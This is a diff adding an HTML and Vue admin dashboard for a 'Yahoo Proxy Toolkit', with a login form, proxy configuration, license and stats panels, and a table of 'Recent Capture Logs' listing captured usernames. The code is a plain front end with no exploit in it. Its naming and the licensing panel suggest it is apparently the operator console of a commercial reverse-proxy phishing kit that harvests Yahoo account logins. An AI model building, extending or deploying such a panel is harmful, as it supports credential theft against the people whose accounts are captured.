@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Yahoo Proxy Toolkit - Admin Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body class="bg-gray-100">
+    <div id="app" class="container mx-auto p-6">
+        <div v-if="!isAuthenticated" class="login-form">
+            <form @submit.prevent="login" class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
+                <input v-model="username" type="text" placeholder="Username" class="input">
+                <input v-model="password" type="password" placeholder="Password" class="input">
+                <button type="submit" class="btn">Login</button>
+            </form>
+        </div>
+
+        <div v-else class="dashboard">
+            <h1 class="text-2xl font-bold mb-4">Admin Dashboard</h1>
+            
+            <div class="grid grid-cols-3 gap-4">
+                <div class="bg-white p-4 rounded shadow">
+                    <h2 class="font-bold">Proxy Configuration</h2>
+                    <pre>{{ proxyConfig }}</pre>
+                </div>
+                
+                <div class="bg-white p-4 rounded shadow">
+                    <h2 class="font-bold">License Information</h2>
+                    <pre>{{ licenseInfo }}</pre>
+                </div>
+                
+                <div class="bg-white p-4 rounded shadow">
+                    <h2 class="font-bold">System Stats</h2>
+                    <pre>{{ systemStats }}</pre>
+                </div>
+            </div>
+
+            <div class="mt-4">
+                <h2 class="font-bold">Recent Capture Logs</h2>
+                <table class="w-full bg-white">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Username</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr v-for="log in captureLogs" :key="log.timestamp">
+                            <td>{{ log.timestamp }}</td>
+                            <td>{{ log.username }}</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <button @click="logout" class="btn mt-4">Logout</button>
+        </div>
+    </div>
+
+    <script>
+        new Vue({
+            el: '#app',
+            data: {
+                isAuthenticated: false,
+                username: '',
+                password: '',
+                proxyConfig: {},
+                licenseInfo: {},
+                systemStats: {},
+                captureLogs: []
+            },
+            methods: {
+                async login() {
+                    try {
+                        const response = await axios.post('/admin/login', {
+                            username: this.username,
+                            password: this.password
+                        });
+                        
+                        localStorage.setItem('token', response.data.token);
+                        this.isAuthenticated = true;
+                        this.fetchDashboardData();
+                    } catch (error) {
+                        alert('Login failed');
+                    }
+                },
+                logout() {
+                    localStorage.removeItem('token');
+                    this.isAuthenticated = false;
+                },
+                async fetchDashboardData() {
+                    try {
+                        const response = await axios.get('/admin/dashboard-data', {
+                            headers: { 
+                                'Authorization': `Bearer ${localStorage.getItem('token')}` 
+                            }
+                        });
+                        
+                        const { proxyConfig, captureLogs, licenseInfo, systemStats } = response.data;
+                        this.proxyConfig = proxyConfig;
+                        this.captureLogs = captureLogs;
+                        this.licenseInfo = licenseInfo;
+                        this.systemStats = systemStats;
+                    } catch (error) {
+                        alert('Failed to fetch dashboard data');
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
